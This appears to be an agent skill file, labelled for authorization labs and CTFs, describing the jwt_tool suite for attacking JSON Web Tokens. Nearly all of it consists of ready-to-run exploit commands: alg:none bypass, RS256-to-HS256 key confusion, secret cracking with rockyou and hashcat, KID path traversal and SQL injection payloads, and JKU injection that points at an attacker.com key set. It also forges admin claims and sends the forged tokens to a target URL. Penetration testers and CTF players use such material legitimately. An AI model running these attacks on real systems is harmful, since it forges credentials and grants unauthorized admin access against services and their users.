---
name: jwt-tool
description: "Auth/lab ref: broad JWT testing and exploitation toolkit."
license: GNU GPL v3
compatibility: "Linux / macOS / Windows; Python 3."
metadata:
  author: AeonDave
  version: "1.0"
---

# jwt_tool

JWT testing suite — alg:none, algorithm confusion, KID injection, JKU/X5U, secret crack.

## Quick Start

```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool && pip3 install -r requirements.txt

TOKEN="eyJ..."

# Decode and inspect
python3 jwt_tool.py $TOKEN

# Run full automated playbook (test all vulns)
python3 jwt_tool.py $TOKEN -M pb

# Test alg:none
python3 jwt_tool.py $TOKEN -X a

# Brute force secret
python3 jwt_tool.py $TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Algorithm confusion (RS256 → HS256)
python3 jwt_tool.py $TOKEN -X k -pk public.pem

# Interactive tamper (modify claims)
python3 jwt_tool.py $TOKEN -T
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `TOKEN` | JWT to analyze (positional) |
| `-M pb` | **Playbook mode** — automated full audit |
| `-X <mode>` | Exploit mode (see table) |
| `-C` | Crack mode — brute force HMAC secret |
| `-d <file>` | Wordlist for cracking |
| `-T` | Interactive tamper mode |
| `-V` | Verify signature |
| `-pk <file>` | Private or public key file (.pem) |
| `-I` | Injection mode (modify claims non-interactively) |
| `-hc <claim>` | Header claim to modify |
| `-hv <value>` | Header claim value |
| `-pc <claim>` | Payload claim to modify |
| `-pv <value>` | Payload claim value |
| `-S <alg>` | Sign with algorithm: `hs256` / `rs256` / `hs384` etc. |
| `-t <url>` | Send forged token to target URL |
| `-rh <headers>` | Request headers for `-t` |
| `-rc <cookies>` | Request cookies for `-t` |
| `-cv <value>` | Canary value — confirm exploitation success |

## Exploit Modes (`-X`)

| Mode | Flag | Attack |
|------|------|--------|
| `a` | `-X a` | **alg:none** — remove signature requirement |
| `k` | `-X k -pk pub.pem` | **Key confusion** — RS256→HS256 with public key as HMAC secret |
| `s` | `-X s -ju URL` | **JKU injection** — point to attacker-controlled JWKS |
| `n` | `-X n` | **Null signature** — empty signature field |

## Common Attack Workflows

### 1. Automated Playbook (start here)

```bash
python3 jwt_tool.py $TOKEN -M pb
# Tests all known attack types automatically
```

### 2. alg:none Bypass

```bash
python3 jwt_tool.py $TOKEN -X a
# Also try: set role/admin claim before
python3 jwt_tool.py $TOKEN -X a -I -pc role -pv admin
```

### 3. Algorithm Confusion (RS256 → HS256)

```bash
# Need server's public key (from JWKS endpoint or certificate)
# Get from: https://target.com/.well-known/jwks.json
# Extract PEM with: python3 jwt_tool.py $TOKEN -X k

python3 jwt_tool.py $TOKEN -X k -pk public.pem
# Also escalate privilege:
python3 jwt_tool.py $TOKEN -X k -pk public.pem -I -pc admin -pv true
```

### 4. Secret Brute Force

```bash
# Standard wordlist
python3 jwt_tool.py $TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Custom small list (CTF)
python3 jwt_tool.py $TOKEN -C -d ctf_secrets.txt

# Fast alternative with hashcat (GPU)
# Extract: <header>.<payload>.<signature>
echo -n "$TOKEN" | hashcat -a 0 -m 16500 - wordlist.txt
```

### 5. KID Injection

```bash
# Path traversal (sign with /dev/null = empty key)
python3 jwt_tool.py $TOKEN -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# Path traversal to known file
python3 jwt_tool.py $TOKEN -I -hc kid -hv "../../etc/passwd" -S hs256 -p "root:x:0:0:..."

# SQL injection in kid
python3 jwt_tool.py $TOKEN -I -hc kid -hv "none' UNION SELECT 'hacked'-- -" -S hs256 -p "hacked"
```

### 6. JKU / X5U Injection

```bash
# Host malicious JWKS at https://attacker.com/.well-known/jwks.json
# jwt_tool auto-generates the JWKS and uses attacker key

python3 jwt_tool.py $TOKEN -X s -ju "https://attacker.com/.well-known/jwks.json"
```

### 7. Interactive Claim Tampering

```bash
# Interactive: shows each field, lets you edit
python3 jwt_tool.py $TOKEN -T

# Non-interactive: set specific claim
python3 jwt_tool.py $TOKEN -I -pc sub -pv admin
python3 jwt_tool.py $TOKEN -I -pc role -pv superadmin
python3 jwt_tool.py $TOKEN -I -pc is_admin -pv true
```

### 8. Verify Signature

```bash
python3 jwt_tool.py $TOKEN -V -pk public.pem
```

## Send Forged Token to Target

```bash
# Test forged token directly
python3 jwt_tool.py $TOKEN -X a \
    -t "https://target.com/api/admin" \
    -rh "Authorization: Bearer TARGETJWT" \
    -cv "admin panel"    # confirm success if this string appears
```

## Quick CTF Checklist

```bash
# 1. alg:none
python3 jwt_tool.py $TOKEN -X a

# 2. Common secrets
python3 jwt_tool.py $TOKEN -C -d /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt

# 3. Algorithm confusion (if RS256)
python3 jwt_tool.py $TOKEN -X k

# 4. Tamper claims
python3 jwt_tool.py $TOKEN -T

# 5. kid path traversal
python3 jwt_tool.py $TOKEN -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# 6. Full playbook
python3 jwt_tool.py $TOKEN -M pb
```

## Resources

| File | When to load |
|------|--------------|
| `references/jwt-attacks.md` | Algorithm confusion deep-dive, KID SQLi, JKU server setup, claim escalation patterns, CTF tricks |
